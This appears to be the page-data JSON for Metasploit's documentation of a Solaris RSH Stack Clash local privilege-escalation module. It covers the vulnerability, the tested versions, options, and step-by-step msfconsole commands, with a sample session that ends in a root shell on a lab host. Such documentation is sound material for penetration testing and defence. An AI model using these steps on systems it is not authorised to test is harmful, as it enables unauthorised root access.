{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/solaris/local/rsh_stack_clash_priv_esc","result":{"data":{"moduleMetadataJson":{"id":"3c822905-125a-5fc2-99b7-7f00d163090d","name":"Solaris RSH Stack Clash Privilege Escalation","fullname":"exploit/solaris/local/rsh_stack_clash_priv_esc","description":"This module exploits a vulnerability in RSH on unpatched Solaris\n        systems which allows users to gain root privileges.\n\n        The stack guard page on unpatched Solaris systems is of\n        insufficient size to prevent collisions between the stack\n        and heap memory, aka Stack Clash.\n\n        This module uploads and executes Qualys' Solaris_rsh.c exploit,\n        which exploits a vulnerability in RSH to bypass the stack guard\n        page to write to the stack and create a SUID root shell.\n\n        This module has offsets for Solaris versions 11.1 (x86) and\n        Solaris 11.3 (x86).\n\n        Exploitation will usually complete within a few minutes using\n        the default number of worker threads (10). Occasionally,\n        exploitation will fail. If the target system is vulnerable,\n        usually re-running the exploit will be successful.\n\n        This module has been tested successfully on Solaris 11.1 (x86)\n        and Solaris 11.3 (x86).","rank":400,"fields":{"detailsSlug":"/modules/details/exploit/solaris/local/rsh_stack_clash_priv_esc","documentationSlug":"/modules/documentation/exploit/solaris/local/rsh_stack_clash_priv_esc"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>  This module exploits a vulnerability in RSH on unpatched Solaris\nsystems which allows users to gain root privileges.</p>\n<p>  The stack guard page on unpatched Solaris systems is of\ninsufficient size to prevent collisions between the stack\nand heap memory, aka Stack Clash.</p>\n<p>  This module uploads and executes Qualys' Solaris_rsh.c exploit,\nwhich exploits a vulnerability in RSH to bypass the stack guard\npage to write to the stack and create a SUID root shell.</p>\n<p>  This module has offsets for Solaris versions 11.1 (x86) and\nSolaris 11.3 (x86).</p>\n<p>  Exploitation will usually complete within a few minutes using\nthe default number of worker threads (10). Occasionally,\nexploitation will fail. If the target system is vulnerable,\nusually re-running the exploit will be successful.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  This module has been tested successfully on:</p>\n<ul>\n<li>Solaris 11.1 (x86)</li>\n<li>Solaris 11.3 (x86)</li>\n</ul>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li>Get a session</li>\n<li>Do: <code class=\"language-text\">use exploit/solaris/local/rsh_stack_clash_priv_esc</code></li>\n<li>Do: <code class=\"language-text\">set SESSION [SESSION]</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should get a new <em>root</em> session</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>SESSION</strong></p>\n<p>  Which session to use, which can be viewed with <code class=\"language-text\">sessions</code>.</p>\n<p>  <strong>RSH_PATH</strong></p>\n<p>  Path to rsh executable. (default: <code class=\"language-text\">/usr/bin/rsh</code>)</p>\n<p>  <strong>WORKERS</strong></p>\n<p>  Number of workers. (default: <code class=\"language-text\">10</code>)</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"solaris-113-x86\" style=\"position:relative;\"><a href=\"#solaris-113-x86\" aria-label=\"solaris 113 x86 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Solaris 11.3 (x86)</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/solaris/local/rsh_stack_clash_priv_esc\nmsf5 exploit(solaris/local/rsh_stack_clash_priv_esc) &gt; set session 1\nsession =&gt; 1\nmsf5 exploit(solaris/local/rsh_stack_clash_priv_esc) &gt; set rhost 172.16.191.221\nrhost =&gt; 172.16.191.221\nmsf5 exploit(solaris/local/rsh_stack_clash_priv_esc) &gt; run\n\n[!] SESSION may not be compatible with this module.\n[*] Using target: Solaris 11.3\n[*] Writing &#39;/tmp/.2yZgv2XkEj/.KJqSwhpguh.c&#39; (10297 bytes) ...\n[*] Symlinking /tmp/.2yZgv2XkEj/.KJqSwhpguh to /tmp/.2yZgv2XkEj/ROOT\n[*] Creating suid root shell. This may take a while...\n[*] Completed in 324.21s\n[+] suid root shell created: /tmp/.2yZgv2XkEj/ROOT\n[*] Writing &#39;/tmp/.2yZgv2XkEj/.bWjzWVllCB&#39; (109 bytes) ...\n[*] Executing payload...\n[*] Started bind TCP handler against 172.16.191.221:4444\n[+] Deleted /tmp/.2yZgv2XkEj/.KJqSwhpguh.c\n[+] Deleted /tmp/.2yZgv2XkEj/.KJqSwhpguh\n[!] Tried to delete /tmp/.2yZgv2XkEj/ROOT, unknown result\n[+] Deleted /tmp/.2yZgv2XkEj/.bWjzWVllCB\n[+] Deleted /tmp/.2yZgv2XkEj\n\nid\nuid=0(root) gid=0(root) groups=10(staff)\nuname -a\nSunOS solaris 5.11 11.3 i86pc i386 i86pc\ncat /etc/release\n                             Oracle Solaris 11.3 X86\n  Copyright (c) 1983, 2015, Oracle and/or its affiliates.  All rights reserved.\n                            Assembled 06 October 2015</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"3c822905-125a-5fc2-99b7-7f00d163090d"}}}